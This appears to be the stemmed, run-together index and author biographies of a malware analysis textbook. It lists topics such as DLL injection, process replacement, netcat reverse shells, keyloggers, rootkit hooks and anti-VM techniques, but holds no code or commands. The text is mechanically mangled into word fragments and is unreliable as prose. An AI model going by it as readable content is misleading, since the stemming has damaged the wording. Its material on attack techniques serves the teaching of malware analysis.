analysi decod stackform short answer decod xor encod filenam check find find string find antivm techniqu use search vulner instruct function manipul detail analysi malwar detail analysi obfusc comparison detail analysi pack file detail analysi python script convert data detail analysi recogn cryptograph algorithm common cryptograph algorithm send debugg display use window api string list identifi keylogg userspac keylogg string tool find string tool malwar analysi search execut find string string window ida pro use window analysi strncmp function dll inject analyz dll analyz dll detail analysi detail analysi detail analysi modul name comparison detail analysi ollydbg detail analysisstrncpi function detail analysi strrchr function decod stackform string detail analysi strstr function detail analysi structur except handl seh clsid iid use com object misus structur except handler misus structur except handler detail analysi chain misus structur except handler misus misus structur except handler structur identifi struct creat new process search symbol view structur inform look kernelmod code netcat revers shell use window api find kerneldl memori find kerneldl memori detail analysi detail analysi decod xor encod string use memori map locat dll use memori map locat dll analyz function major function tabl analyz function major function tabl analyz function major function tabl detail analysi detail analysi appli ida pro use memori map locat dll atinfo use memori map locat dll eprocess analyz function major function tabl analyz function major function tabl chang analyz function major function tabl examin windbg analyz function major function tabl identifi identifi struct ininitializationorderlink list find kerneldl memori listentri find kerneldl memori analyz function major function tabl manual check use window apimicrosoft symbol view inform search symbol overlay data onto view structur inform sockaddrin decod xor encod string detail analysi startupinfo creat new process netcat revers shell detail analysi systemtim detail analysi timerel manipul detail analysi unicodestr window kernel look kernelmod code structur window ida pro use window analysi sub encod algorithm identifi xor loop ida pro sub link ida pro use link crossrefer subkey registri window registri subtract instruct simpl instruct suspend process resum detail analysi suspend state creat process process replac suspendthread function import window function svchost dll appinitdl svchostex dll inject detail analysi detail analysi malwar launch detail analysi run orphan process detail analysi switch statement style style jump tabl jump tabl detail analysi detail analysi detail analysi graph indic detail analysi style style jump tabl jump tabl jump tabl detail analysissymbol constant socket function detail analysi symbol link creat analyz execut ida pro symbol set breakpoint set breakpoint search symbol configur window symbol view structur inform search symbol configur configur window symbol search set breakpoint syscal instruct except thing go wrong find driver object sysent instruct except thing go wrong sysintern autorun program identifi keylogg string list system account interprocess coordin mutex system binari trojan persist svchost dll system call filter filter procmon system function import window function system memori global vs local variabl see memori system residu check check ntglobalflag system servic descriptor tabl ssdt find driver object rootkit check rootkit hook find driver object systemfunct function hash dump systemfunct function hash dump systemtim structur detail analysi systemtimetofiletim function detail analysist tail jump tail jump use autom tool find oep winupack lab solut lab solut find oep use autom tool find oep elimin code lab solut examin code lab solut program pack upack winupack target malwar type malwar target phish indic malici activ tcp handshak captur basic dynam tool practic tcpview tool malwar analysi teb thread environ block misus structur except handler terminateprocess function iat hook cover tracksusermod rootkit test instruct stack layout text section pe file potentialkeyloggerex unpack execut pe file header section text mode ida pro graph mode tf trap flag gener regist sleuth kit tsk tool malwar analysi themida winupack think c eckel objectori program pointer objectori program pointer detail analysi detail analysi disassembl pointerthread context creat new process thread environ block teb misus structur except handler thread identifi tid detail analysi thread inform block tib misus structur except handler thread local storag tl callback use queryperformancecount gettickcount threadfirst function import window function threadnext function import window function thread creat new process absolut vs rel address thread target detail analysi window creat new process program access context detail analysi target thread target view ollydbg absolut vs rel address threatexpert basic dynam analysi tib thread inform block misus structur except handler tid thread identifi detail analysi time date stamp descript pe file pe file header section timerel structur manipul detail analysi timestomp detail analysi time check int scan queryperformancecount function queryperformancecount function gettickcount function gettickcount function queryperformancecount function rdtsc function gettickcount function queryperformancecount queryperformancecount functiontl thread local storag callback use queryperformancecount gettickcount toolhelpreadprocessmemori function import window function tor opsec oper secur tool malwar analysi trace ollydbg load dll traffic log malwar activ understand surround code transfer file virtual machin take snapshot trap flag except trojan system binari persist svchost dll truman tool malwar analysi tsk sleuth kit tool malwar analysi type librari load manual ida pro use name constant type window api handlesu u unassembl command windbg set breakpoint ultim packer execut detect packer peid see upx ultim packer execut uncondit jump stack layout detail analysi undo featur snapshot connect disconnect peripher devic unescap function javascript nop sled detail analysi unhandl except misus structur except handler unhookwindowshookex function thread target unicod string find string unicodestr structur window kernel look kernelmod code uniform resourc locat url open download malwar detail analysi detail analysi unload function analysi windbg vs ida pro analyz labsi windbg unmapviewofsect function detail analysi unpack detect packer peid tail jump autom unpack winupack lab solut analyz malwar without winupack exampl tail jump manual autom unpack unpack stub packer unpack packer anatomi autom unpack winupack lab solut size winupack upack entropi calcul pecompactupx ultim packer execut detect packer peid entropi calcul autom unpack repair import tabl manual tool malwar analysi review final check pack modifi version review final check tip trick repair import tabl manual upxpack malwar detail analysi urldownloadtocachefil function download launcher detail analysi decrypt ae detail analysi detail analysi urldownloadtofil function understand surround code import window function detail analysi url uniform resourc locat open download malwar detail analysi detail analysi usb flash drive driver kernel code user mode except thing go wrong debug driver kernel code call applic driver kernel code debugg vs kernel mode debug window except thing go wrong user space configur window symbol userspac keylogg apc inject apc inject apc inject keylogg userspac keylogg look code configur window symbol userag intrus detect snort attack mimic exist protocol understand surround code identifi leverag encod step short answer detail analysi detail analysi dynam gener short answer malwar intrus detect snort attack mimic existingprotocol detail analysi string signatur detail analysi usermod apc apc inject usermod rootkit use sedebugprivileg cover tracksusermod rootkit cover tracksusermod rootkit iat hook cover tracksusermod rootkit inlin hook cover tracksusermod rootkit userdl explor dynam link function depend walker potentialkeyloggerex unpack execut short answersv valu entri registri common registri function variabl global vs local recogn c code construct assembl vera visual execut revers analysi tool malwar analysi victim inform malwar gather detail analysi view process process explor view process process explor virtual address automat name enhanc disassembl virtual function tabl virtual vs nonvirtu function use vtabl detail analysi recogn use vtabl virtual function vs nonvirtu inherit function overrid virtual machin team set hostonli network virtual machin malwar analysi virtual machin malwar analysi virtual machin configur vmware set hostonli network connect disconnect peripher devic take snapshot sandbox drawback monitor process monitor set kernel debug opsec oper secur antivirtu machin techniqu tweak set examin hook ollydbg short answer see also antivirtu machin antivm techniqu crash procmon monitor process monitor disconnect network configur vmware escap tweak set hide precis locat opsec oper secur malwar detect sandbox drawbacksmalwar effort detect antivirtu machin techniqu short answer option boot debuggeren version os set kernel debug set examin hook ollydbg structur malwar analysi virtual machin take snapshot connect disconnect peripher devic transfer file take snapshot use multipl set hostonli network virtual network configur vmware basic dynam tool practic virtual size examin pe file peview virtualalloc function softwar breakpoint detail analysi poison ivi use softwar breakpoint virtualallocex function launcher dll inject dll inject dll inject nop sled import window function summari detail analysi detail analysi direct inject dll inject process inject launcher virtualprotectex function import window function virtuals field pe header pe header vulner viru type malwar common except languag set common except virustot antiviru scan use first step tool malwar analysi short answer detail analysi visual execut revers analysi vera tool malwar analysi vmcat tweak set vmchat tweak settingsvmdragnhack tweak set vmdragnsploit tweak set vmftp tweak set vmware malwar analysi virtual machin structur virtual machin structur virtual machin use malwar analysi machin connect disconnect peripher devic take snapshot risk use vmware malwar analysi risk use vmware malwar analysi singlestep driver kernel code set kernel debug antivirtu machin techniqu use scoopyng artifact antivirtu machin techniqu configur structur virtual machin configur creat virtual connect host os set kernel debug disk space use structur virtual machin kernel debug setup driver kernel code moviecaptur featur risk use vmware malwar analysi network address translat nat mode use malwar analysi machin recordreplay risk use vmware malwar analysi singl step risk use malwar analysi take snapshot set avoid detect use scoopyng snapshot manag connect disconnect peripher devic vmware player malwar analysi virtual machin vmware tool structur virtual machin vmware artifact instal structur virtual machin stop servic vmware artifactsvmwar workstat malwar analysi virtual machin tool malwar analysi vmwareserviceex antivirtu machin techniqu vmwaretrayex antivirtu machin techniqu vmwareuserex antivirtu machin techniqu vmx file use scoopyng volatil framework tool malwar analysi von neumann architectur reverseengin vtabl virtual vs nonvirtu function use vtabl recogn use vtablesw w end window function name explor dynam link function depend walker waitformultipleobjectsex function apc inject waitforsingleobject function creat thread waitforsingleobjectex function apc inject watch window ollydbg analyz shellcod web applic burp suit test tool malwar analysi web browser malwar determin default short answer wep wire equival privaci use malwar analysi machin loop understand function call convent whoi request domain get ip address domain inform whostherealt hash dump whkeyboard procedur local remot hook whkeyboardl procedur local remot hook wifi protect access wpa use malwar analysi machin wide charact string find string widechartomultibyt function import window function win devic namespac file access via namespac winshareprocess type servic windbg debug kernel debug windbg set kernel debug set kernel debug read memori read memori set breakpoint find driver object rootkit load driver lab use tl callback tool malwar analysi appli structur ida pro view labsi ida pro analyz labsi windbg analyz labsi windbg find driver memori withwindbg analyz function major function tabl detail analysi arithmet oper read memori breakpoint read memori connect virtual machin set kernel debug eprocess structur examin analyz function major function tabl find devic driver memori find driver memori windbg kernel debugg analyz labsi windbg lab lab appli structur ida pro solut appli structur ida pro load driver load driver modul list set breakpoint output detail analysi read memori set kernel debug rootkit find driver object ssdt view rootkit system breakpoint use tl callback view driver view labsi ida pro vs ida pro analyz labsi windbg window mode ida pro load execut window portabl execut file format pe file header section structur virtual machin server client side network server client side network basic dll structur creat new process creat thread interprocess coordin mutex servic clsid iid use com object except thing go wrong except thing go wrong kernel vs user mode driver kernel code netcat revers shell winupacka virtual os structur virtual machin blue screen except thing go wrong compon object model com servic devic driver driver kernel code execut common section pe file header section follow run malwar server client side network server client side network basic dll structur creat new process creat thread interprocess coordin mutex clsid iid use com object dynam link librari dll server client side network except clsid iid use com object interprocess coordin mutex creat thread process basic dll structur servic interprocess coordin mutex thread creat new process function import link function portabl execut file format kernel vs user mode except thing go wrong nativ api kernel vs user mode revers shell netcat revers shell tool dump process winupack window bit window bit wow subsystem prologu epilogu bit code window kernel issu load driver window api use name constant handl file system function file system function file access via namespac berkeley compat socket window debugg detect analyz execod call function analyz exe debugg detect window debugg detect file system function file system function handl file system function ida pro catalog name constant use name constant network api berkeley compat socket special file file access via namespac window debugg detect window debugg detect window debugg detect use window api manual check structur use window api window api window debugg detect window file protect detail analysi detail analysi window function explor dynam link function depend walker import window function ex suffix explor dynam link function depend walker window internet wininet api server client side network understand surround code detail analysi short answer short answer advantag disadvantag short answer window malwar analyz malici window program lab detail analysi lab lab detail analysi solut detail analysi window nt nativ api refer nebbett nativ api window registri window registri see registri windowswindow socket winsock api understand surround code window updat binari detail analysi detail analysi detail analysi malwar creation handler detail analysi move temporari directori detail analysi string temporari move detail analysi window virtual machin basic dynam tool practic window vista kernel issu load driver window xp dll loadord hijack short answer default search order load dll dll loadord hijack disabl firewal short answer winexec function import window function detail analysi wingraph applic analyz function winhex tool malwar analysi detail analysi detail analysi wininet window internet api server client side network understand surround code detail analysi short answer short answer advantag disadvantag short answer wininetdl explor dynam link function depend walker detail analysi detail analysi import detail analysi winlogon notifi appinitdl winlogon open handl detail analysi winmain function analysi detail analysi winmd calcul antiviru scan use first step find string winobj object manag file access via namespaceswinsock window socket api understand surround code winsock librari berkeley compat socket winupack pecompact lab solut wire equival privaci wep use malwar analysi machin wireshark monitor netcat packet snif wireshark packet snif wireshark basic dynam tool practic basic dynam tool practic tool malwar analysi detail analysi dn http exampl packet snif wireshark follow tcp stream window packet snif wireshark packet snif monitor netcat review captur basic dynam tool practic witti worm file access via namespac wlx function name begin gina intercept wlxloggedonsa function import window function word document analyz process explor analyz malici document word type window api handl worm type malwar wow window bit window bit subsystem prologu epilogu bit code wowdisablewowfsredirect function window bit window bit import window function wpa wifi protect access use malwar analysi machin writefil function file system function configur window symbol look kernelmod code detail analysi detail analysi origin handl pass detail analysiswriteprocessmemori function launcher dll inject dll inject dll inject nop sled import window function summari detail analysi detail analysi direct inject dll inject process inject launcher wsdll explor dynam link function depend walker server client side network detail analysi detail analysi import detail analysi wsagetlasterror function server client side network understand surround code wsasocket function filenam check detail analysi wsastartup function server client side network understand surround code import window function filenam check detail analysi wshtcpipdll detail analysi wsockdll explor dynam link function depend walker wupdmgrex detail analysi detail analysi launch detail analysisx x command windbg search symbol x architectur bit malwar differ x architectur differ x call convent stack usag detail analysi differ call convent stack usag differ x architectur except handl differ x call convent stack usag malwar compon detail analysi x window kernel issu load driver x architectur reverseengin main memori main memori instruct instruct regist flag arithmet stack stack function call stack layout stack layout branch rep instruct inform intel x architectur manual vulner instruct shellcod analysi positionindepend code short answer branch stack layout c main method offset rep instruct code type data access shellcod analysi condit stack layout document manual inform intel x architectur manual instruct set generalpurpos regist positionindepend code instruct main memori main memori main memori nop instruct arithmet opcod endian instruct operand instruct regist regist vulner instructionsrep instruct branch search vulner instruct short answer simpl instruct flag stack stack stack function call function call stack layout function call x disassembl crash cours x disassembl level abstract level abstract level abstract level abstract reverseengin level abstract x architectur bit malwar x floatingpoint unit fpu use callpop xen structur virtual machin xor cipher xor xor bruteforc xor encod nullpreserv singlebyt xor encod bruteforc xor identifi loop ida pro nullpreserv singlebyt xor encod null preserv singlebyt bruteforc xor encod xor encod string decod filenam check xor encod loop detail analysi xor instruct arithmet identifi xor loop ida pro detail analysi detail analysi short answer form identifi xor loop ida pro search short answer search nonzero detail analysisxor logic oper x architectur arithmet xref jump tabl see crossrefer xref xref window ida pro code crossreferencesi yara tool malwar analysi yuschuk oleh ollydbgz zero wine tool malwar analysi zeroday exploit set hostonli network dll loadord hijack zf zero flag gener regist stack layout zombi rat zwcontinu function tail jump zwcreatefil function look kernelmod code zwdeviceiocontrolfil function inlin hook inlin hook zwunmapviewofsect function process replac zynam bindiff use commerci pluginsabout author michael sikorski princip consult mandiant provid special research develop secur solut compani feder client base revers engin malici softwar discov incid respond help creat seri cours malwar analysi beginn advanc taught cours varieti audienc includ fbi nation secur agenc nsa blackhat former member mit lincoln laboratori nsa hold top secret secur clearanc andrew honig inform assur expert depart defens teach cours softwar analysi revers engin window system program andi publicli credit sever zeroday exploit vmware virtual product